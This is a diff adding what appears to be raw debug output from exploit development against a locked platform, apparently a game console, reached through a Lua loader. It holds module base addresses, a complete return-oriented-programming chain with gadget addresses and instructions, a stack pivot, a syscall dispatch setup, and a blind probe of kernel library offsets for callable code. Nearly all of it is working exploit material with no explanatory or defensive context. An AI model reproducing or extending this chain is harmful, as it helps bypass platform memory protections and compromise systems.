@@ -1,0 +1,129 @@
+=== PROBE 56g: SYSCALL GADGET HUNT ===
+
+[A] Module bases
+  eboot text:     0x00000000_418E0000
+  eboot text sz:  0x00000005_00494000
+  libkernel text: 0x00000008_0507C000
+  libkernel text sz: 0x00000004_00048000
+  rawequal:       0x00000003_10FCB820
+  our PID: 240
+
+[B] Loader's syscall dispatch
+  pipe metatable found
+  __call addr: 0x00000003_11035AA0
+  __call +0x20: 0x00000003_11053160
+
+  syscall.pipe contents:
+  tostring: address @ 0x80507cb57
+
+ropchain @ 0x3111860f0 (size: 0x2f0)
+
+fcall_stub.fn_addr: 0x311185fd0
+fcall_stub.return_addr: 0x311185fe0
+
+0x3111860f0: 0x418e0042	; ret
+0x3111860f8: 0x418e0992	; pop rax; ret
+0x311186100: 0x311184040
+0x311186108: 0x418feebb	; mov rax, [rax]; ret
+0x311186110: 0x419a9dfe	; pop rdi; ret
+0x311186118: 0x311185fd0
+0x311186120: 0x41972c67	; mov [rdi], rax; ret
+0x311186128: 0x418e0992	; pop rax; ret
+0x311186130: 0x311186348
+0x311186138: 0x419a9dfe	; pop rdi; ret
+0x311186140: 0x311185fe0
+0x311186148: 0x41972c67	; mov [rdi], rax; ret
+0x311186150: 0x418e0992	; pop rax; ret
+0x311186158: 0x3111840b0
+0x311186160: 0x418feebb	; mov rax, [rax]; ret
+0x311186168: 0x419a9dfe	; pop rdi; ret
+0x311186170: 0x311186198
+0x311186178: 0x41972c67	; mov [rdi], rax; ret
+0x311186180: 0x418e0992	; pop rax; ret
+0x311186188: 0x311188100
+0x311186190: 0x41a21fc7	; pop r13; pop r14; pop r15; ret
+0x311186198: 0x0
+0x3111861a0: 0x418e0042	; ret
+0x3111861a8: 0x418e0042	; ret
+0x3111861b0: 0x41a16970	; mov r9, r13; call [rax + 8]
+0x3111861b8: 0x418e0992	; pop rax; ret
+0x3111861c0: 0x41a16970	; mov r9, r13; call [rax + 8]
+0x3111861c8: 0x419a9dfe	; pop rdi; ret
+0x3111861d0: 0x3111861b0
+0x3111861d8: 0x41972c67	; mov [rdi], rax; ret
+0x3111861e0: 0x418e0992	; pop rax; ret
+0x3111861e8: 0x3111840a0
+0x3111861f0: 0x418feebb	; mov rax, [rax]; ret
+0x3111861f8: 0x419a9dfe	; pop rdi; ret
+0x311186200: 0x311186218
+0x311186208: 0x41972c67	; mov [rdi], rax; ret
+0x311186210: 0x418e0991	; pop r8; ret
+0x311186218: 0x0
+0x311186220: 0x418e0992	; pop rax; ret
+0x311186228: 0x311184090
+0x311186230: 0x418feebb	; mov rax, [rax]; ret
+0x311186238: 0x419a9dfe	; pop rdi; ret
+0x311186240: 0x311186258
+0x311186248: 0x41972c67	; mov [rdi], rax; ret
+0x311186250: 0x418e0e64	; pop rcx; ret
+0x311186258: 0x0
+0x311186260: 0x418e0992	; pop rax; ret
+0x311186268: 0x311184080
+0x311186270: 0x418feebb	; mov rax, [rax]; ret
+0x311186278: 0x419a9dfe	; pop rdi; ret
+0x311186280: 0x311186298
+0x311186288: 0x41972c67	; mov [rdi], rax; ret
+0x311186290: 0x41c902d7	; pop rdx; ret
+0x311186298: 0x0
+0x3111862a0: 0x418e0992	; pop rax; ret
+0x3111862a8: 0x311184070
+0x3111862b0: 0x418feebb	; mov rax, [rax]; ret
+0x3111862b8: 0x419a9dfe	; pop rdi; ret
+0x3111862c0: 0x3111862d8
+0x3111862c8: 0x41972c67	; mov [rdi], rax; ret
+0x3111862d0: 0x418ed77d	; pop rsi; ret
+0x3111862d8: 0x0
+0x3111862e0: 0x418e0992	; pop rax; ret
+0x3111862e8: 0x311184060
+0x3111862f0: 0x418feebb	; mov rax, [rax]; ret
+0x3111862f8: 0x419a9dfe	; pop rdi; ret
+0x311186300: 0x311186318
+0x311186308: 0x41972c67	; mov [rdi], rax; ret
+0x311186310: 0x419a9dfe	; pop rdi; ret
+0x311186318: 0x31118a500
+0x311186320: 0x418e0992	; pop rax; ret
+0x311186328: 0x311184050
+0x311186330: 0x418feebb	; mov rax, [rax]; ret
+0x311186338: 0x418e09a2	; pop rsp; ret
+0x311186340: 0x311185fd0
+0x311186348: 0x419a9dfe	; pop rdi; ret
+0x311186350: 0x311188120
+0x311186358: 0x41972c67	; mov [rdi], rax; ret
+0x311186360: 0x418e0992	; pop rax; ret
+0x311186368: 0x1bd51c070	; longjmp
+0x311186370: 0x419a9dfe	; pop rdi; ret
+0x311186378: 0x311185fd0
+0x311186380: 0x41972c67	; mov [rdi], rax; ret
+0x311186388: 0x418e0992	; pop rax; ret
+0x311186390: 0x3111863e0
+0x311186398: 0x419a9dfe	; pop rdi; ret
+0x3111863a0: 0x311185fe0
+0x3111863a8: 0x41972c67	; mov [rdi], rax; ret
+0x3111863b0: 0x419a9dfe	; pop rdi; ret
+0x3111863b8: 0x311188130
+0x3111863c0: 0x418ed77d	; pop rsi; ret
+0x3111863c8: 0x0
+0x3111863d0: 0x418e09a2	; pop rsp; ret
+0x3111863d8: 0x311185fd0
+    .fn_addr = 0x80507cb57
+    .syscall_no = 42
+
+[C] Pipe object deep inspection
+  fn_addr: 0x311185fd0
+  *fn_addr: 0x00009FE5_11188130
+  -> NOT in eboot .text
+  rop chain: 0x3111860f0
+
+[D] Blind probe for callable code in libkernel
+  Testing 263 libkernel offsets via pcall
+  (redirecting rawequal, calling with pcall, checking for non-crash)
